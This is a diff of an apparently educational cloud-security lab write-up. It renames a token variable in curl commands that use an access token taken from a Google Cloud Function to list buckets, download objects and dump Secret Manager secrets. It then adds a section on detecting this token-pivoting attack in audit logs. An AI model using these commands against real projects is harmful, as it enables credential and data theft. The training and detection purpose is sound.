@@ -214,7 +214,7 @@ At the time of this writing, I have not found a way to load up the OAuth access 
 Set the *access_token* and project environment variables locally using the values obtained from the function execution environment.
 
 ```bash
-export GOOGLE_ACCESS_TOKEN=<INSERT ACCESS TOKEN>
+export GOOGLE_TOKEN=<INSERT ACCESS TOKEN>
 export GOOGLE_PROJECT=<GOOGLE PROJECT>
 ```
 
@@ -223,34 +223,34 @@ TODO: Write a bucket exfiltration script to do the following for us for all buck
 List the buckets for the project and query the first bucket:
 
 ```bash
-curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq '.items[0].selfLink'
+curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq '.items[0].selfLink'
 ```
 
 List the objects in the storage bucket
 
 ```bash
-export GOOGLE_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq -r '.items[0].selfLink')
-curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_PROJECT_BUCKET/o"
+export GOOGLE_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq -r '.items[0].selfLink')
+curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_PROJECT_BUCKET/o"
 ```
 
 Download the object from the bucket:
 
 ```bash
-export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
-curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
+export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
+curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
 ```
 
 At the time of this writing, the secrets manager appears to still be in Beta. See the [API Reference](https://cloud.google.com/secret-manager/docs/reference/rest/v1beta1/projects.secrets) for details on accessing the API. List the secrets in the project:
 
 ```bash
-curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets
+curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets
 ```
 
 Dump the secret value:
 
 ```bash
-export SECRET_NAME=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets | jq -r '.secrets[0].name')
-curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
+export SECRET_NAME=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets | jq -r '.secrets[0].name')
+curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
 ```
 
 By default this returns a *403* from the service account running the function:
@@ -269,7 +269,7 @@ It appears this is not included the default editor role permissions. You have to
 
 
 ```bash
-curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
+curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
 
 {
   "name": "projects/123/secrets/cheetah-database-pass/versions/1",
@@ -316,3 +316,114 @@ Stackdriver services captures and stores function logs, error reporting, and rec
 
 Instrumenting the function with audit logging statements, such as follows will write logs to the Stackdriver Logging service.
 
+### Cloud Audit
+
+- Head to the IAM Audit Logs service. Enable admin and data logging. This can be global, or by service. Then, you'll get audit data for API calls.
+
+- Invoke Cheetah to cause **normal** behavior.
+
+- Stackdriver is the log viewer that will allow you to see the normal activity versus malicious activity.
+
+  - In the log dropdown, selected Audited Resources
+
+  - Start searching for the log files for **Secret Manager** **AccessSecretVersion** calls. You should find a log entry similar to the following:
+
+      ```json
+      {
+        insertId: "suvz8ge1dkpo"  
+        logName: "projects/google-project-id/logs/cloudaudit.googleapis.com%2Fdata_access"  
+        protoPayload: {
+          @type: "type.googleapis.com/google.cloud.audit.AuditLog"
+          authenticationInfo: {
+          principalEmail: "123456789012-compute@developer.gserviceaccount.com"
+          principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
+          }
+          authorizationInfo: [
+          0: {
+            granted: true
+            permission: "secretmanager.versions.access"
+            resourceAttributes: {
+            }
+          }
+          ]
+          methodName: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
+          request: {
+          @type: "type.googleapis.com/google.cloud.secrets.v1beta1.AccessSecretVersionRequest"
+          name: "projects/google-project-id/secrets/cheetah-database-pass/versions/latest"
+          }
+          requestMetadata: {
+            callerIp: "2600:1900:2000:38:400::13"
+            callerSuppliedUserAgent: "grpc-go/1.26.0,gzip(gfe),gzip(gfe)"
+            destinationAttributes: {
+          }
+          requestAttributes: {
+            auth: {
+            }
+            time: "2020-01-09T23:55:02.888841562Z"
+          }
+          }
+          resourceName: "projects/123456789012/secrets/cheetah-database-pass/versions/latest"
+          serviceName: "secretmanager.googleapis.com"
+        }
+        receiveTimestamp: "2020-01-09T23:55:03.543549591Z"  
+        resource: {
+          labels: {
+          method: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
+          project_id: "google-project-id"
+          service: "secretmanager.googleapis.com"
+          }
+          type: "audited_resource"
+        }
+        severity: "INFO"  
+        timestamp: "2020-01-09T23:55:02.882192620Z"  
+      }
+      ```
+
+  - Notice the user account is the function service account and request metadata from inside the platform infrastructure:
+
+    ```json
+    principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
+    ```
+
+    ```json
+    requestMetadata: {
+          callerIp: "2600:1900:2000:38:400::13"
+          callerSuppliedUserAgent: "grpc-go/1.26.0,gzip(gfe),gzip(gfe)"
+          ...
+    }
+    ```
+
+- Replay the above **Token Pivoting** attack, extracting the auth token from the function, and dumping the secret from your attack machine.
+
+- Search the Stackdriver logs again. Notice this new malicious log entry. Same user account, except not coming from the Go GRPC package. This time from curl and from a different (non-IPv6) address:
+
+  ```json
+  {
+    insertId: "1d4dg1pd50ae"  
+    logName: "projects/google-project-id/logs/cloudaudit.googleapis.com%2Fdata_access"  
+    protoPayload: {
+      @type: "type.googleapis.com/google.cloud.audit.AuditLog"
+      authenticationInfo: {
+      principalEmail: "123456789012-compute@developer.gserviceaccount.com"
+      principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
+      }
+      authorizationInfo: [1]
+      methodName: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
+      request: {…}
+      requestMetadata: {
+        callerIp: "95.025.143.109"
+        callerSuppliedUserAgent: "curl/7.64.1,gzip(gfe),gzip(gfe)"
+        destinationAttributes: {…}
+        requestAttributes: {…}
+      }
+      resourceName: "projects/123456789012/secrets/cheetah-database-pass/versions/latest"
+      serviceName: "secretmanager.googleapis.com"
+    }
+    receiveTimestamp: "2020-01-10T20:30:00.403050477Z"  
+    resource: {…}  
+    severity: "INFO"  
+    timestamp: "2020-01-10T20:30:00.192825193Z"
+  }
+  ```
+
+- For whats it's worth, this anomaly is not detected by the **Security Command Center** threat detection or anomaly detection rules.
